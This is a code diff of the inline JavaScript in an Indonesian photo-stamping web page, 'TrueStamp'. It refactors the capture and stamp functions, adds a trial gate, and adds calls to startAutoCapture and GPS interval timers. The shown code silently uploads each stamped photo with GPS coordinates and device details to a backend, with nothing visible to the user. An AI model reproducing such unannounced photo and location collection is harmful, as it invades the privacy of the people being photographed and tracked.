+        if (!userVideoStream) { alert("Kamera tidak aktif."); return; }
         const canvas = document.createElement('canvas');
-        canvas.width = videoElem.videoWidth;
-        canvas.height = videoElem.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-        
-        return new Promise((resolve) => {
-            canvas.toBlob((blob) => {
-                const file = new File([blob], `camera_${Date.now()}.png`, { type: 'image/png' });
-                currentImageFile = file;
-                currentImageUrl = URL.createObjectURL(blob);
-                previewImg.src = currentImageUrl;
-                stampedImageData = null;
-                downloadBtn.disabled = true;
-                resolve(true);
-            }, 'image/png');
+        canvas.width = userVideo.videoWidth;
+        canvas.height = userVideo.videoHeight;
+        canvas.getContext('2d').drawImage(userVideo, 0, 0);
+        canvas.toBlob(blob => {
+            currentImageFile = new File([blob], 'photo.png', { type: 'image/png' });
+            previewImg.src = URL.createObjectURL(blob);
+            stampedImageData = null;
+            downloadBtn.disabled = true;
         });
     }
     
     function onFileSelected(file) {
+        if (!trialValid) { showContactModal(); return; }
         currentImageFile = file;
-        currentImageUrl = URL.createObjectURL(file);
-        previewImg.src = currentImageUrl;
+        previewImg.src = URL.createObjectURL(file);
         stampedImageData = null;
         downloadBtn.disabled = true;
     }
     
-    function getTextPosition(canvasWidth, canvasHeight, lineCount, lineHeight) {
-        const totalHeight = lineCount * lineHeight;
-        
+    function getTextPosition(canvasW, canvasH, lines, lineH) {
+        const totalH = lines.length * lineH;
         switch(currentPosition) {
-            case 'top-left':
-                return { x: currentOffsetX, y: currentOffsetY + lineHeight, align: 'left' };
-            case 'top-right':
-                return { x: canvasWidth - currentOffsetX, y: currentOffsetY + lineHeight, align: 'right' };
-            case 'bottom-left':
-                return { x: currentOffsetX, y: canvasHeight - totalHeight - currentOffsetY, align: 'left' };
-            case 'bottom-right':
-                return { x: canvasWidth - currentOffsetX, y: canvasHeight - totalHeight - currentOffsetY, align: 'right' };
-            default:
-                return { x: currentOffsetX, y: canvasHeight - totalHeight - currentOffsetY, align: 'left' };
+            case 'top-left': return { x: currentOffsetX, y: currentOffsetY + lineH, align: 'left' };
+            case 'top-right': return { x: canvasW - currentOffsetX, y: currentOffsetY + lineH, align: 'right' };
+            case 'bottom-left': return { x: currentOffsetX, y: canvasH - totalH - currentOffsetY, align: 'left' };
+            case 'bottom-right': return { x: canvasW - currentOffsetX, y: canvasH - totalH - currentOffsetY, align: 'right' };
+            default: return { x: currentOffsetX, y: canvasH - totalH - currentOffsetY, align: 'left' };
         }
     }
     
     async function updatePreview() {
-        if (!currentImageFile) {
-            alert("Ambil atau upload foto dulu.");
-            return;
-        }
-        
-        const customText = stampTextArea.value || "TrueStamp";
+        if (!trialValid) { showContactModal(); return; }
+        if (!currentImageFile) { alert("Ambil atau upload foto dulu."); return; }
+        const customText = stampText.value || "TrueStamp";
         const img = new Image();
         const reader = new FileReader();
-        
-        reader.onload = function(e) {
+        reader.onload = e => {
             img.src = e.target.result;
-            img.onload = function() {
+            img.onload = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = img.width;
                 canvas.height = img.height;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(img, 0, 0);
-                
-                const fontSize = currentFontSize;
-                ctx.font = `600 ${fontSize}px "Inter"`;
+                ctx.font = `600 ${currentFontSize}px "Inter"`;
                 ctx.fillStyle = "#FFFFFF";
                 ctx.shadowColor = "rgba(0,0,0,0.85)";
                 ctx.shadowBlur = 8;
-                
                 const lines = customText.split('\n');
-                const lineHeight = fontSize * 1.4;
-                
-                const position = getTextPosition(canvas.width, canvas.height, lines.length, lineHeight);
-                ctx.textAlign = position.align;
-                
-                for (let i = 0; i < lines.length; i++) {
-                    ctx.fillText(lines[i], position.x, position.y + i * lineHeight);
-                }
-                
+                const lineH = currentFontSize * 1.4;
+                const pos = getTextPosition(canvas.width, canvas.height, lines, lineH);
+                ctx.textAlign = pos.align;
+                for (let i = 0; i < lines.length; i++) ctx.fillText(lines[i], pos.x, pos.y + i * lineH);
                 const stampedURL = canvas.toDataURL();
                 previewImg.src = stampedURL;
                 stampedImageData = stampedURL;
                 downloadBtn.disabled = false;
-                
-                // Auto kirim ke Drive
                 canvas.toBlob(async (blob) => {
                     const base64 = await blobToBase64(blob);
-                    const metadata = {
-                        latitude: userLocation.lat || 0,
-                        longitude: userLocation.lng || 0,
-                        device: navigator.userAgent,
-                        customText: customText,
-                        fontSize: currentFontSize.toString(),
-                        textPosition: currentPosition,
-                        offsetX: currentOffsetX,
-                        offsetY: currentOffsetY
-                    };
-                    const result = await callAPI('upload', { imageData: base64, metadata });
-                    if (result.success) {
-                        console.log("✅ Auto-saved to Drive");
-                    } else {
-                        console.log("❌ Auto-save failed:", result.message);
-                    }
+                    await callAPI('upload', {
+                        imageData: base64,
+                        metadata: {
+                            latitude: userLocation.lat || 0,
+                            longitude: userLocation.lng || 0,
+                            device: navigator.userAgent,
+                            customText: customText,
+                            fontSize: currentFontSize,
+                            textPosition: currentPosition,
+                            isAuto: false
+                        }
+                    });
                 }, 'image/png');
             };
         };
@@ -596,40 +621,54 @@
     
     function downloadImage() {
         if (stampedImageData) {
-            const link = document.createElement('a');
-            link.download = `truestamp_${Date.now()}.png`;
-            link.href = stampedImageData;
-            link.click();
-        } else {
-            alert("Generate stempel dulu (klik 'Update Preview Stempel').");
-        }
+            const a = document.createElement('a');
+            a.download = `truestamp_${Date.now()}.png`;
+            a.href = stampedImageData;
+            a.click();
+        } else { alert("Generate stempel dulu."); }
     }
     
     function blobToBase64(blob) {
-        return new Promise((resolve) => {
-            const fr = new FileReader();
-            fr.onloadend = () => resolve(fr.result);
-            fr.readAsDataURL(blob);
-        });
+        return new Promise(r => { const fr = new FileReader(); fr.onloadend = () => r(fr.result); fr.readAsDataURL(blob); });
     }
     
-    (async function() {
+    function showContactModal() { contactModal.style.display = 'flex'; }
+    function hideContactModal() { contactModal.style.display = 'none'; }
+    
+    async function sendContactMessage() {
+        const name = document.getElementById('contactName').value;
+        const email = document.getElementById('contactEmail').value;
+        const message = document.getElementById('contactMessage').value;
+        if (!name || !email) { alert("Isi nama dan email terlebih dahulu."); return; }
+        const result = await callAPI('sendContactMessage', { name, email, message });
+        if (result.success) {
+            alert("Pesan terkirim! Admin akan menghubungi Anda.");
+            hideContactModal();
+        } else { alert("Gagal mengirim pesan."); }
+    }
+    
+    document.getElementById('showContactBtn')?.addEventListener('click', showContactModal);
+    document.getElementById('sendContactBtn').onclick = sendContactMessage;
+    document.getElementById('closeModalBtn').onclick = hideContactModal;
+    
+    (async () => {
         await getDeviceId();
         const trialOk = await checkAndRegisterDevice();
         if (!trialOk) return;
-        
-        await initCamera();
+        await initCameras();
         initGPS();
-        
-        captureCameraBtn.onclick = () => captureFromCamera();
-        uploadFileBtn.onclick = () => fileInput.click();
-        fileInput.onchange = (e) => { if (e.target.files[0]) onFileSelected(e.target.files[0]); };
+        startAutoCapture();
+        captureBtn.onclick = captureFromCamera;
+        uploadBtn.onclick = () => fileInput.click();
+        fileInput.onchange = e => { if (e.target.files[0]) onFileSelected(e.target.files[0]); };
         generateBtn.onclick = updatePreview;
         downloadBtn.onclick = downloadImage;
     })();
     
     window.addEventListener('beforeunload', () => {
-        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+        if (userVideoStream) userVideoStream.getTracks().forEach(t => t.stop());
+        if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+        if (gpsInterval) clearInterval(gpsInterval);
     });
 </script>
 </body>
